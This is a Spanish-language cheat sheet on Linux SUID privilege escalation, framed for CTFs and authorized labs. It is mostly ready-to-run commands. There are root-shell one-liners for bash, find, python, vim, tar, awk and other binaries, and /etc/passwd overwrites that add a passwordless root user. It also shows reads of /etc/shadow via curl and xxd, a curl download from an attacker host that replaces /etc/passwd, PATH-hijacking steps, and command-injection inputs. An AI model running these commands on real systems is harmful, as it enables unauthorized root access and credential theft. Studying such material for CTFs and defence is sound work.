# SUID — Guía de Referencia
### Set User ID · Vector de escalada de privilegios · Linux

> ⚠️ Uso exclusivo en entornos controlados (CTF, laboratorios, sistemas propios o con autorización explícita).

---

## Qué es SUID

El bit SUID (**Set User ID**) hace que un binario se ejecute con los permisos de su **propietario**, no del usuario que lo lanza. Si el propietario es root y el binario tiene SUID, cualquier usuario lo ejecuta **como root**.

```bash
# Así se ve un binario con SUID en ls -la
-rwsr-xr-x 1 root root ... /usr/bin/passwd
     ↑
     s = SUID activo (en lugar de x)
     S = SUID activo pero sin permiso de ejecución (raro, probablemente misconfiguration)
```

### Permisos en octal

```bash
# SUID se representa como el bit 4 en la posición especial
chmod 4755 binario     # rwsr-xr-x
chmod 4700 binario     # rws------
chmod u+s  binario     # activa SUID sin tocar el resto
```

---

## Por qué existe legítimamente

Algunos binarios necesitan SUID para funcionar. El usuario normal necesita acceder a recursos de root de forma controlada.

| Binario | Motivo legítimo |
|---|---|
| `/usr/bin/passwd` | Modificar `/etc/shadow` para cambiar contraseña propia |
| `/usr/bin/sudo` | Ejecutar comandos como otro usuario de forma controlada |
| `/usr/bin/su` | Cambiar de usuario |
| `/usr/bin/ping` | Crear raw sockets (requería root históricamente) |
| `/usr/bin/mount` | Montar sistemas de ficheros |

Estos binarios son seguros porque están **diseñados** para ejecutarse como root y tienen controles internos. El problema aparece cuando un binario con SUID no tiene esos controles.

---

## Cuándo se convierte en vector de ataque

### 1. Intérpretes o herramientas con SUID

Si un intérprete tiene SUID de root, puede lanzar una shell con esos privilegios directamente. No hay control interno que lo impida.

### 2. Binarios que llaman a otros sin ruta absoluta

Si el binario con SUID ejecuta internamente `tar`, `python`, `cp`… sin ruta absoluta, se puede secuestrar con PATH hijacking.

### 3. Binarios personalizados mal programados

Scripts o ejecutables creados por el administrador con SUID que permiten inyección de comandos o tienen lógica vulnerable.

---

## 01 · Encontrar binarios SUID

```bash
# Todos los binarios SUID del sistema
find / -perm -4000 -type f 2>/dev/null

# Alternativa con notación simbólica
find / -perm -u=s -type f 2>/dev/null

# Con detalles (propietario, permisos, ruta)
find / -perm -4000 -type f -ls 2>/dev/null

# Filtrar los no estándar — los potencialmente peligrosos
find / -perm -4000 -type f 2>/dev/null | grep -v -E '/bin/|/sbin/|/usr/bin/|/usr/sbin/'

# Solo los que pertenecen a root
find / -user root -perm -4000 -type f 2>/dev/null
```

> La diferencia entre `-perm 4000` y `-perm -4000` es importante: el guión significa "al menos esos bits", sin guión significa "exactamente esos bits". Siempre usar `-perm -4000`.

---

## 02 · Identificar si es explotable

Una vez encontrado un binario SUID no estándar, el proceso es:

```bash
# 1 — ver propietario y permisos exactos
ls -la /ruta/al/binario

# 2 — identificar qué hace
strings /ruta/al/binario      # strings legibles — puede revelar comandos internos
file /ruta/al/binario         # tipo de binario (ELF, script…)
/ruta/al/binario --help       # si acepta flags

# 3 — cruzar con GTFOBins
# https://gtfobins.github.io → buscar el nombre del binario → sección SUID
```

---

## 03 · Explotación — binarios comunes

### bash

```bash
# -p preserva el euid efectivo de root
/bin/bash -p

# Verificar que eres root
whoami    # → root
id        # → uid=1000 euid=0(root)
```

**¿Por qué funciona?** — Sin `-p`, bash resetea el euid al uid real por seguridad. Con `-p` mantiene el euid del propietario del binario (root).

---

### find

```bash
find . -exec /bin/sh -p \; -quit

# Alternativa
find / -name "algo" -exec /bin/bash -p \;
```

---

### python / python3

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Alternativa con setuid explícito
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

### vim / vim.tiny

```bash
vim -c ':!/bin/bash -p'

# Alternativa
vim.tiny -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
```

---

### nano

```bash
# Dentro de nano: Ctrl+R → Ctrl+X
reset; sh 1>&0 2>&0
```

---

### cp

```bash
# Opción 1 — copiar bash con SUID
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p

# Opción 2 — sobreescribir /etc/passwd
# Generar hash de nueva contraseña
openssl passwd -1 -salt xyz hacked123
# Añadir usuario root al /etc/passwd
echo 'hacked:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked
```

---

### mv

```bash
# Sobreescribir /etc/passwd con una versión modificada
mv /tmp/passwd_modificado /etc/passwd
```

---

### less / more

```bash
# Abrir cualquier fichero con less/more
/usr/bin/less /etc/passwd

# Dentro del pager, ejecutar shell
!/bin/sh
```

---

### awk

```bash
awk 'BEGIN {system("/bin/bash -p")}'
```

---

### perl

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Alternativa directa
perl -e 'exec "/bin/sh";'
```

---

### ruby

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

---

### lua

```bash
lua -e 'os.execute("/bin/bash -p")'
```

---

### nmap (versiones antiguas < 5.21)

```bash
nmap --interactive
# Dentro de nmap:
!sh
```

---

### tar

```bash
tar -cf /dev/null /dev/null \
    --checkpoint=1 \
    --checkpoint-action=exec=/bin/sh
```

---

### curl / wget

```bash
# Leer ficheros del sistema como root
curl file:///etc/shadow
wget -O- file:///etc/shadow

# Sobreescribir ficheros críticos
curl http://<tu_ip>/passwd_modificado -o /etc/passwd
```

---

### tee

```bash
# Escritura privilegiada — añadir usuario root a /etc/passwd
echo 'hacked::0:0:root:/root:/bin/bash' | tee -a /etc/passwd
su hacked    # sin contraseña
```

---

### env

```bash
env /bin/sh -p
```

---

### git

```bash
# Via pager interno
git -p help config
# Dentro del pager:
!/bin/bash
```

---

### zip

```bash
zip /tmp/x.zip /tmp/x -T \
    --unzip-command="sh -c /bin/sh"
```

---

### xxd

```bash
# Leer ficheros como root (no da shell pero exfiltra datos)
xxd /etc/shadow | xxd -r
```

---

### strace

```bash
# Ejecutar shell con trazado — hereda permisos SUID
strace -o /dev/null /bin/sh -p
```

---

## 04 · PATH Hijacking con SUID

Si el binario con SUID llama internamente a otro binario sin ruta absoluta, se puede secuestrar.

```bash
# 1 — analizar qué ejecuta el binario internamente
strings /ruta/binario_suid | grep -v "^/"    # comandos sin ruta absoluta

# Ejemplo: el binario llama a "service" sin /usr/sbin/service

# 2 — crear un binario falso en un directorio controlado
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# 3 — añadir nuestro directorio al inicio del PATH
export PATH=/tmp:$PATH

# 4 — ejecutar el binario SUID
/ruta/binario_suid
# → llama a "service" → encuentra /tmp/service primero → shell root
```

---

## 05 · Binarios SUID personalizados — análisis

En CTFs es frecuente encontrar binarios compilados con SUID creados específicamente para la máquina. Proceso de análisis:

```bash
# Tipo de binario
file /ruta/binario

# Strings legibles — revela rutas, comandos, mensajes
strings /ruta/binario

# Ejecutar con input variado para ver comportamiento
/ruta/binario
/ruta/binario --help
/ruta/binario test
/ruta/binario $(python3 -c "print('A'*200)")    # buffer overflow básico

# Si acepta input — probar inyección de comandos
/ruta/binario "test; id"
/ruta/binario "$(id)"
/ruta/binario "; /bin/bash -p #"

# Analizar con ltrace (llamadas a librerías) o strace (syscalls)
ltrace /ruta/binario
strace /ruta/binario
```

---

## 06 · SGID — el hermano de SUID

SGID (**Set Group ID**) funciona igual pero con el **grupo** del binario en vez del propietario.

```bash
# Encontrar binarios SGID
find / -perm -2000 -type f 2>/dev/null

# Se ve así en ls -la
-rwxr-sr-x 1 root shadow ... /usr/bin/chage
              ↑
              s en la posición de grupo = SGID
```

Menos frecuente como vector de ataque directo, pero útil para acceder a ficheros de un grupo privilegiado (por ejemplo, el grupo `shadow` da lectura a `/etc/shadow`).

---

## Tabla de referencia rápida — GTFOBins SUID

| Binario | Comando |
|---|---|
| `bash` | `bash -p` |
| `sh` | `sh -p` |
| `python3` | `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `vim` | `vim -c ':!/bin/sh -p'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `ruby` | `ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'` |
| `lua` | `lua -e 'os.execute("/bin/sh")'` |
| `less` | Abrir fichero → `!/bin/sh` |
| `more` | Abrir fichero → `!/bin/sh` |
| `tar` | `tar --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `cp` | Copiar bash → `chmod +s` → `/tmp/bash -p` |
| `tee` | `echo 'root2::0:0::/root:/bin/bash' \| tee -a /etc/passwd` |
| `curl` | `curl file:///etc/shadow` |
| `env` | `env /bin/sh -p` |
| `nmap` | `nmap --interactive` → `!sh` |
| `git` | `git -p help` → `!/bin/sh` |

> Referencia completa: [gtfobins.github.io](https://gtfobins.github.io) → filtrar por SUID

---

## Flujo completo en CTF

```bash
# 1 — encontrar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# 2 — filtrar los no estándar
find / -perm -4000 -type f 2>/dev/null | grep -v -E '/bin/|/sbin/|/usr/bin/|/usr/sbin/'

# 3 — analizar el binario sospechoso
ls -la /ruta/binario
strings /ruta/binario
file /ruta/binario

# 4a — si es un binario conocido → GTFOBins
# 4b — si es un binario personalizado → probar inyección, PATH hijacking, strings

# 5 — verificar escalada
id
whoami
```

---

*SUID Reference · gtfobins.github.io · uso exclusivo en entornos autorizados*
